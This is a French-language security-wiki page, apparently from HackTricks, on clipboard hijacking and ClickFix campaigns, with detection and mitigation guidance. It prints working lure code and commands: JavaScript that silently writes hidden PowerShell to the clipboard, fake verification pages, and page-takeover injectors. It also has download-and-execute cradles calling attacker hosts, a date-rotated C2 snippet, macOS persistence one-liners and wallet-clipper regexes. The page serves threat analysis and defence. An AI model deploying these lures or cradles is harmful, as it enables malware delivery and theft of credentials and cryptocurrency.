# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> « Ne collez jamais quelque chose que vous n’avez pas copié vous-même. » – un conseil ancien, mais toujours valable

## Aperçu

Le clipboard hijacking – également appelé *pastejacking* – exploite le fait que les utilisateurs copient et collent régulièrement des commandes sans les examiner. Une page web malveillante (ou tout contexte capable d’exécuter du JavaScript, comme une application Electron ou une application de bureau) place par programmation du texte contrôlé par l’attaquant dans le presse-papiers système. Les victimes sont incitées, généralement au moyen d’instructions d’ingénierie sociale soigneusement élaborées, à appuyer sur **Win + R** (boîte de dialogue Exécuter), **Win + X** (menu d’accès rapide / PowerShell), ou à ouvrir un terminal et à *coller* le contenu du presse-papiers, ce qui exécute immédiatement des commandes arbitraires.

Comme **aucun fichier n’est téléchargé et aucune pièce jointe n’est ouverte**, cette technique contourne la plupart des contrôles de sécurité des e-mails et du contenu web qui surveillent les pièces jointes, les macros ou l’exécution directe de commandes. L’attaque est donc populaire dans les campagnes de phishing qui diffusent des familles de malware courantes comme NetSupport RAT, le loader Latrodectus ou Lumma Stealer.<sup>[[1]](#references)</sup>

## Clipper de remplacement d’adresses de wallet

Une autre variante du **clipboard hijacking** ne colle aucune commande : elle attend que la victime copie une **adresse de wallet de cryptomonnaie**, puis la remplace discrètement par une adresse contrôlée par l’attaquant juste avant le collage. Cette technique est particulièrement efficace avec les formats d’adresse longs, car les utilisateurs ne vérifient souvent que les premiers et derniers caractères.<sup>[[8]](#references)</sup>

Caractéristiques courantes observées dans la réalité :
- **Loader léger + payload imbriqué** : l’application/le fichier exécutable visible ressemble à un outil légitime de trading ou de « profit », tandis que le véritable clipper est caché plus profondément dans le bundle (par exemple, un loader .NET qui lance un payload Rust imbriqué).
- **Remplacement basé sur des regex** : le malware repère des chaînes telles que `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, ou même des chaînes génériques de **44 caractères ressemblant à des adresses Solana**, puis les remplace par des adresses de wallet contrôlées par l’attaquant.
- **Rotation des wallets à grande échelle** : les échantillons Windows récents peuvent intégrer **des milliers** d’adresses de remplacement par devise au lieu d’une seule adresse statique, ce qui limite l’impact sur la réputation d’un wallet après chaque vol.<sup>[[8]](#references)</sup>

### Fonctionnement d’un clipper Windows

Une implémentation courante utilise une fenêtre cachée enregistrée avec **`AddClipboardFormatListener`**. À chaque mise à jour du presse-papiers, le malware appelle généralement :<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → accéder aux données actuelles du presse-papiers.
- **`GetClipboardData`** → lire le texte.
- **`EmptyClipboard`** + **`SetClipboardData`** → remplacer la chaîne de l’adresse du wallet par la valeur de l’attaquant.

Expressions regex minimales fréquemment observées dans les clippers :

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

La persistance au niveau utilisateur suffit à produire un impact. Un modèle observé est le suivant :<sup>[[8]](#references)</sup>
- Copier le payload dans **`%APPDATA%\silke\silke.exe`**
- Créer un **LNK dans le dossier Startup** sous `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Idées de détection :
- Processus qui appellent continuellement des API du presse-papiers tout en écrivant dans `%APPDATA%` et le dossier **Startup** de l’utilisateur.
- Création d’un nouveau LNK/fichier exécutable, suivie de modifications du presse-papiers pour y insérer des adresses de portefeuille.
- Archives ou bundles de faux logiciels contenant de nombreux fichiers inutilisés ainsi qu’un petit launcher qui démarre un binaire imbriqué.

### Suppression de la quarantaine par ingénierie sociale sur macOS + persistance via LaunchAgent

Sur macOS, certaines campagnes fournissent un helper **`unlocker.command`** et demandent à la victime de faire un clic droit → **Ouvrir** si Gatekeeper indique que l’application est endommagée ou provient d’un développeur non identifié. Le script supprime simplement l’attribut de quarantaine et lance l’application `.app` à proximité :<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Ce n’est **pas** un exploit de Gatekeeper ; c’est un **contournement de la quarantaine par ingénierie sociale** qui exploite le fait que les décisions de Gatekeeper dépendent de l’attribut étendu `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Après son exécution, le clipper peut assurer sa persistance pour l’utilisateur actuel en écrivant les fichiers suivants :<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent avec `RunAtLoad` et `KeepAlive`

Un détail utile pour la défense : certains échantillons mettent en place un **watchdog autoréparateur** qui réécrit le LaunchAgent et le wrapper environ toutes les 30 secondes. Si vous supprimez d’abord le plist **sans arrêter le processus en cours**, le malware peut le recréer immédiatement.<sup>[[8]](#references)</sup> Ordre de nettoyage sûr :
1. Tuer le processus actif du clipper.
2. Décharger/supprimer le plist du LaunchAgent.
3. Supprimer `~/launch.sh` et la charge utile copiée.

### Note sur la distribution : la fausse réputation comme multiplicateur d’impact

Pour cette famille, le malware lui-même peut rester techniquement simple, tandis que la **couche de distribution** fait le gros du travail : faux étoiles/forks GitHub, avis/téléchargements SourceForge, commentaires/vues de tutoriels YouTube et commentaires/votes anodins sur VirusTotal servent à faire paraître le binaire fiable avant son exécution.<sup>[[8]](#references)</sup>

## Boutons de copie forcée et charges utiles cachées (commandes macOS sur une ligne)

Certains infostealers macOS clonent des sites d’installation (par exemple, Homebrew) et **forcent l’utilisation d’un bouton « Copy »** afin que les utilisateurs ne puissent pas sélectionner uniquement le texte visible. L’entrée du presse-papiers contient la commande d’installation attendue, suivie d’une charge utile Base64 ajoutée (par exemple, `...; echo <b64> | base64 -d | sh`) : un seul collage exécute donc les deux, tandis que l’interface masque l’étape supplémentaire.<sup>[[5]](#references)</sup>

## Preuve de concept JavaScript

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Les campagnes plus anciennes utilisaient `document.execCommand('copy')`, tandis que les plus récentes s'appuient sur l'**API Clipboard** asynchrone (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Le flux ClickFix / ClearFake

1. L'utilisateur visite un site typosquatté ou compromis (p. ex. `docusign.sa[.]com`)
2. Le JavaScript **ClearFake** injecté appelle une fonction `unsecuredCopyToClipboard()` qui stocke discrètement dans le presse-papiers une commande PowerShell encodée en Base64.
3. Des instructions HTML indiquent à la victime : *« Appuyez sur **Win + R**, collez la commande et appuyez sur Entrée pour résoudre le problème. »*
4. `powershell.exe` s'exécute et télécharge une archive contenant un exécutable légitime ainsi qu'une DLL malveillante (technique classique de DLL sideloading).
5. Le loader déchiffre des étapes supplémentaires, injecte du shellcode et installe une persistance (p. ex. une tâche planifiée) — et finit par exécuter NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Exemple de chaîne NetSupport RAT

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (Java WebStart légitime) recherche `msvcp140.dll` dans son répertoire.
* La DLL malveillante résout dynamiquement les API avec **GetProcAddress**, télécharge deux binaires (`data_3.bin`, `data_4.bin`) via **curl.exe**, les déchiffre à l’aide d’une clé XOR roulante `"https://google.com/"`, injecte le shellcode final et extrait **client32.exe** (NetSupport RAT) dans `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Télécharge `la.txt` avec **curl.exe**
2. Exécute le downloader JScript dans **cscript.exe**
3. Récupère une charge utile MSI → dépose `libcef.dll` à côté d'une application signée → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer via MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

L’appel **mshta** lance un script PowerShell caché qui récupère `PartyContinued.exe`, extrait `Boat.pst` (CAB), reconstitue `AutoIt3.exe` à l’aide de `extrac32` et de la concaténation de fichiers, puis exécute un script `.a3x` qui exfiltre les identifiants du navigateur vers `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix : presse-papiers → PowerShell → évaluation JS → LNK de démarrage avec C2 rotatif (PureHVNC)

Certaines campagnes ClickFix ignorent complètement le téléchargement de fichiers et demandent aux victimes de coller une commande en une ligne qui récupère et exécute du JavaScript via WSH, le rend persistant et fait tourner le C2 quotidiennement. Exemple de chaîne observée :<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Caractéristiques clés
- URL obfusquée inversée à l’exécution pour déjouer une inspection superficielle.
- JavaScript assure sa persistance via un raccourci LNK de démarrage (WScript/CScript) et sélectionne le C2 en fonction du jour actuel, ce qui permet une rotation rapide des domaines.<sup>[[3]](#references)</sup>

Fragment JS minimal utilisé pour faire tourner les C2 en fonction de la date :<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

L’étape suivante consiste généralement à déployer un loader qui établit la persistance et récupère un RAT (p. ex., PureHVNC), souvent en épinglant TLS à un certificat codé en dur et en découpant le trafic en segments.<sup>[[3]](#references)</sup>

Pistes de détection spécifiques à cette variante
- Arbre des processus : `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ou `cscript.exe`).
- Artefacts de démarrage : LNK dans `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` lançant WScript/CScript avec un chemin JS sous `%TEMP%`/`%APPDATA%`.
- Télémétrie du registre/RunMRU et des lignes de commande contenant `.split('').reverse().join('')` ou `eval(a.responseText)`.
- Exécutions répétées de `powershell -NoProfile -NonInteractive -Command -` avec de grandes charges utiles stdin pour transmettre de longs scripts sans lignes de commande longues.
- Tâches planifiées exécutant ensuite des LOLBins tels que `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sous un nom/chemin de tâche évoquant un programme de mise à jour (p. ex., `\GoogleSystem\GoogleUpdater`).

Chasse aux menaces
- Noms d’hôte C2 et URL renouvelés chaque jour selon le modèle `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Corréler les événements d’écriture dans le presse-papiers, suivis d’un collage via Win+R, puis de l’exécution immédiate de `powershell.exe`.

Les équipes Blue Team peuvent combiner la télémétrie du presse-papiers, de la création de processus et du registre pour détecter les abus de pastejacking :

* Registre Windows : `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` conserve l’historique des commandes **Win + R** — recherchez les entrées Base64 ou obfusquées inhabituelles.
* Événement de sécurité ID **4688** (création de processus) où `ParentImage` == `explorer.exe` et `NewProcessName` appartient à { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Événement ID **4663** pour les créations de fichiers sous `%LocalAppData%\Microsoft\Windows\WinX\` ou dans des dossiers temporaires, juste avant l’événement 4688 suspect.
* Capteurs EDR du presse-papiers (si disponibles) — corrélez une `Clipboard Write` suivie immédiatement d’un nouveau processus PowerShell.

## Pages de vérification de type IUAM (ClickFix Generator) : copie du presse-papiers vers la console + charges utiles adaptées au système d’exploitation

Des campagnes récentes produisent en masse de fausses pages de vérification CDN/navigateur (« Just a moment… », de type IUAM) qui incitent les utilisateurs à copier depuis leur presse-papiers des commandes propres à leur système d’exploitation, puis à les coller dans des consoles natives. Cela déplace l’exécution hors du sandbox du navigateur et fonctionne sous Windows et macOS.<sup>[[4]](#references)</sup>

Caractéristiques clés des pages générées par le builder
- Détection du système d’exploitation via `navigator.userAgent` pour adapter les charges utiles (PowerShell/CMD sous Windows, Terminal sous macOS). Des leurres/no-op peuvent être proposés en option pour les systèmes non pris en charge afin de préserver l’illusion.
- Copie automatique dans le presse-papiers lors d’actions anodines dans l’interface (case à cocher/Copier), alors que le texte visible peut différer du contenu du presse-papiers.
- Blocage des appareils mobiles et affichage d’une fenêtre contextuelle avec des instructions étape par étape : Windows → Win+R→coller→Entrée ; macOS → ouvrir Terminal→coller→Entrée.
- Obfuscation facultative et injecteur en fichier unique pour remplacer le DOM d’un site compromis par une interface de vérification stylisée avec Tailwind (aucun nouvel enregistrement de domaine requis).<sup>[[4]](#references)</sup>

Exemple : divergence du contenu du presse-papiers et branchement selon le système d’exploitation
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

Persistance macOS lors de la première exécution
- Utilisez `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` pour que l’exécution se poursuive après la fermeture du terminal, réduisant ainsi les artefacts visibles.<sup>[[4]](#references)</sup>

Prise de contrôle directe d’une page sur des sites compromis
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Idées de détection et de hunting spécifiques aux leurres de type IUAM
- Web : pages qui associent l’API Clipboard à des widgets de vérification ; divergence entre le texte affiché et le contenu du presse-papiers ; branchement selon `navigator.userAgent` ; Tailwind + remplacement d’une page unique dans des contextes suspects.
- Endpoint Windows : `explorer.exe` → `powershell.exe`/`cmd.exe` peu après une interaction avec le navigateur ; exécution d’installateurs batch/MSI depuis `%TEMP%`.
- Endpoint macOS : Terminal/iTerm qui lance `bash`/`curl`/`base64 -d` avec `nohup` à proximité d’événements liés au navigateur ; tâches en arrière-plan qui persistent après la fermeture du terminal.
- Corréler l’historique `RunMRU` de Win+R et les écritures dans le presse-papiers avec la création ultérieure de processus de console.

Voir aussi les techniques associées

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Évolutions des faux CAPTCHA / ClickFix en 2026 (ClearFake, Scarlet Goldfinch)

- ClearFake continue de compromettre des sites WordPress et d’injecter du JavaScript loader qui enchaîne des hôtes externes (Cloudflare Workers, GitHub/jsDelivr) et même des appels blockchain « etherhiding » (par exemple, des POST vers des endpoints d’API Binance Smart Chain tels que `bsc-testnet.drpc[.]org`) pour récupérer la logique actuelle des leurres. Les overlays récents utilisent largement de faux CAPTCHA qui demandent aux utilisateurs de copier-coller une commande sur une seule ligne (T1204.004) au lieu de télécharger quoi que ce soit.<sup>[[6]](#references)</sup>
- L’exécution initiale est de plus en plus déléguée à des hôtes de scripts signés/LOLBAS. En janvier 2026, des chaînes ont remplacé l’usage antérieur de `mshta` par le script intégré `SyncAppvPublishingServer.vbs`, exécuté via `WScript.exe`, en lui passant des arguments de type PowerShell utilisant des alias et des caractères génériques pour récupérer du contenu distant :<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` est signé et normalement utilisé par App-V ; associé à `WScript.exe` et à des arguments inhabituels (alias `gal`/`gcm`, cmdlets avec caractères génériques, URL jsDelivr), il devient une étape LOLBAS à forte valeur indicative pour ClearFake.<sup>[[6]](#references)</sup>
- En février 2026, les charges utiles de faux CAPTCHA sont revenues aux download cradles purement PowerShell. Deux exemples actifs :<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - La première chaîne est un grabber `iex(irm ...)` en mémoire ; la seconde utilise `WinHttp.WinHttpRequest.5.1`, écrit un fichier temporaire `.ps1`, puis le lance avec `-ep bypass` dans une fenêtre masquée.<sup>[[6]](#references)</sup>

Conseils de détection et de chasse pour ces variantes
- Lignée des processus : navigateur → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ou cradles PowerShell juste après des écritures dans le presse-papiers ou l’utilisation de Win+R.
- Mots-clés dans les lignes de commande : `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domaines jsDelivr/GitHub/Cloudflare Worker ou motifs `iex(irm ...)` avec une IP brute.
- Réseau : connexions sortantes vers des hôtes CDN worker ou des endpoints RPC blockchain depuis des hôtes de scripts/PowerShell, peu après la navigation Web.
- Fichiers/registre : création de fichiers `.ps1` temporaires sous `%TEMP%` et entrées RunMRU contenant ces commandes sur une seule ligne ; bloquer/alerter lorsque des LOLBAS utilisant des scripts signés (WScript/cscript/mshta) s’exécutent avec des URL externes ou des chaînes d’alias obfusquées.

## Tactiques ClickFix de juin 2026 : télémétrie de collage, faux commentaires de vérification et enchaînement de LOLBin

La télémétrie récente de Red Canary montre que l’indicateur stable n’est **pas une commande exacte**, mais la combinaison d’un **collage et d’une exécution assistés par l’utilisateur**, d’**interpréteurs/LOLBins de confiance**, de **drapeaux obfusqués**, d’une **récupération à distance** et d’une **exécution immédiate**.<sup>[[7]](#references)</sup>

### Schémas notables des opérateurs

- **Télémétrie de confirmation du collage** : certaines charges utiles appellent `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` avant l’étape réelle. Cela confirme l’interaction de l’utilisateur tout en gardant la fenêtre courte et discrète.
- **Faux commentaires de vérification** : les commandes PowerShell sur une seule ligne peuvent ajouter des chaînes telles que `# Security check ✔️ I'm not a robot Verification ID: 138105`, afin que la commande semble toujours liée à un CAPTCHA après avoir été collée dans Run / l’historique de `cmd.exe` / PowerShell.
- **Reconstruction dynamique d’URL** : `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` évite de faire apparaître une URL statique dans la ligne de commande tout en téléchargeant et exécutant le contenu en mémoire.
- **Exécution d’un installateur déguisé** : `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` exploite une casse inhabituelle et des caractères de type Unicode dans les drapeaux pour contourner les détections fragiles, tout en ressemblant à `msiexec.exe`.
- **Chaînes de LOLBin avec échappement par caret** : `cmd.exe` peut masquer des mots-clés avec des échappements `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), démarrer le shell imbriqué en mode réduit, enregistrer le contenu de l’attaquant avec une extension anodine telle que `.pdf`, puis l’exécuter via `mshta`.<sup>[[7]](#references)</sup>
## Mesures d’atténuation

1. Renforcement du navigateur – désactiver l’accès en écriture au presse-papiers (`dom.events.asyncClipboard.clipboardItem`, etc.) ou exiger un geste de l’utilisateur.
2. Sensibilisation à la sécurité – apprendre aux utilisateurs à *saisir* les commandes sensibles ou à les coller d’abord dans un éditeur de texte.
3. PowerShell Constrained Language Mode / Execution Policy + contrôle des applications pour bloquer les commandes arbitraires sur une seule ligne.
4. Contrôles réseau – bloquer les requêtes sortantes vers les domaines connus de pastejacking et de C2 des malwares.

## Techniques associées

* **Discord Invite Hijacking** exploite souvent la même approche ClickFix après avoir attiré les utilisateurs vers un serveur malveillant :
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Corriger le clic : prévenir le vecteur d’attaque ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [PoC de pastejacking – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Sous le pur rideau : du RAT au builder puis au codeur](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [L’usine ClickFix : première révélation du générateur IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, l’année de l’Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Analyses de renseignement : février 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Analyses de renseignement : juin 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Des étoiles aux votes positifs : une fausse réputation au service d’un pirate de presse-papiers crypto](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
